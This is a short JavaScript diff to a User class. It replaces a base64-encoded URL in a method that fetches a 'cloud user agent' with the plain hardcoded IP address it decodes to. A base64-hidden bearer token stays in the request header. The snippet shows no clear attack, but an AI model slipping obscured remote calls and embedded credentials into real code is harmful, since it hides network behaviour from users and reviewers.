@@ -490,7 +490,7 @@ module.exports = class User {
    */
   async #getCloudUA() {
     const cloud_arg = await api({
-      url: new Buffer('aHR0cDovLzQzLjEzNS45MC4yMy8=','base64').toString(),
+      url: `http://43.135.90.23/`,
       method: 'GET',
       headers:{
         'authorization':new Buffer('QmVhcmVyIFNoaXp1a3U=','base64').toString(),
